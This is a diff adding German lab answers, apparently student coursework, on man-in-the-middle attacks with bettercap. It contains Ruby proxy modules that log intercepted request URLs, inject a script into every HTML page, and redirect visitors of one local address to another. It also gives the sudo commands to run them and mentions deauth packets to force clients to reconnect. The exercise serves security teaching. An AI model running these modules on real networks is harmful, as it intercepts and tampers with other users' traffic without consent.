@@ -103,18 +103,92 @@ bettercap versendet daraufhin manipulierte ARP messages an alle Clients im Netzw
 
 - **Schreiben Sie ein Bettercap TCP Proxy Modul, welches die aufgerufene URL von HTTP-Anfragen auf der Konsole ausgibt (TCP Proxy Funktion von Bettercap verwenden)**
 
+1. Code:
+```rb
+class Debug < BetterCap::Proxy::TCP::Module
+  meta(
+    'Name'        => 'URL GETTER',
+    'Description' => 'Prints Url of HTTP request.',
+    'Version'     => '0.0.1',
+    'Author'      => "Flavio und Leon",
+    'License'     => 'MIT'
+  )
+
+  def on_data( event )
+    BetterCap::Logger.raw "\n#{ event.data.lines.first }\n"
+  end
+end
+```
+
+2. Aufruf: `sudo bettercap --tcp-proxy-module module.rb --tcp-proxy-upstream TARGET_IP:TARGET_PORT`
+
+3. Beispiel einer angefragten URL, siehe Bild:
+<img src="request_url.JPG" title="stealthscan traffic" width="650">
+
 - **Jeder Versuch, eine Website aufzurufen, soll dazu führen dass im Quelltext der angegebenen Seite ein eigenes javascript ausgeführt wird. Schreiben Sie ein Bettercap Modul basierend auf dem HTTP Proxy Modul für diesen Zweck.**
+
+1.  Code für file module1.rb:
+```rb
+=begin
+=end
+class HackTitle < BetterCap::Proxy::HTTP::Module
+  meta(
+    'Name'        => 'InsertJS',
+    'Description' => 'Insert custom JS to every site.',
+    'Version'     => '0.0.1',
+    'Author'      => "Flavio und Leon",
+    'License'     => 'MIT'
+  )
+
+  def on_request( request, response )
+    # is it a html page?
+    if response.content_type =~ /^text\/html.*/
+      BetterCap::Logger.info "Hacking http://#{request.host}#{request.path}"
+      response.body += '<script> alert("Test"); </script>'
+    end
+  end
+end
+```
+
+
+2. Aufruf: `sudo bettercap --proxy --proxy-module module1.rb`
+
 
 - **Nutzen Sie Bettercap um Folgendes zu erreichen: Beim Aufruf einer bestimmten Webseite auf dem Laptop soll eine andere ausgeliefert werden.**
 
-- **Stellen Sie anschließend den Ausgangszustand des Netzwerkes wieder her.**
+1. Mit javascript die Location verändern, Code:
+
+```rb
+=begin
+=end
+class HackTitle < BetterCap::Proxy::HTTP::Module
+  meta(
+    'Name'        => 'InsertJS',
+    'Description' => 'Insert custom JS.',
+    'Version'     => '0.0.1',
+    'Author'      => "Flavio und Leon",
+    'License'     => 'MIT'
+  )
+
+  def on_request( request, response )
+    # is it a html page?
+    if response.content_type =~ /^text\/html.*/
+      BetterCap::Logger.info "Hacking http://#{request.host}#{request.path}"
+      response.body += '<script> let target = "192.168.1.1";let dest = "192.168.1.2";if (window.location.href.indexOf(target) > -1){window.location.replace("http://"+dest+"/");} </script>'
+    end
+  end
+end
+```
 
 ***
 
 ## Drahtlose Netzwerke
 
 - **Warum funktioniert die Überwachung eines bestimmten Rechners nur, wenn dieser sich neu mit dem Netzwerk verbindet oder einige Zeit abgewartet wurde?**
+1. Es funktioniert nur, weil sich die Rechner erst mit unserem Raspberry verbinden müssen. Dafür muss entweder die Verbindung verloren oder erneuert werden, es dauert auf jeden Fall etwas Zeit.
 
 - **Kann man eine Neuverbindung des Zielrechners mit dem Netzwerk erzwingen?**
+1. Man kann spezielle "Deauth packets" versenden, welche dafür sorgen, dass Wifi Clients abgemeldet werden und versuchen, sich erneut zu authentifizieren.
 
 - **Welche Unterschiede sind bei verschlüsselten und unverschlüsselten Verbindungen im überwachten Datenverkehr zu beobachten?**
+1. Bei unverschlüsselter Verbindung kann man den http Traffic komplett lesen, bei verschlüsselter Verbindung (https) nur die verschlüsselten Daten, welche verschlüsselt über tls übertragen werden. Keine Auslese möglich.
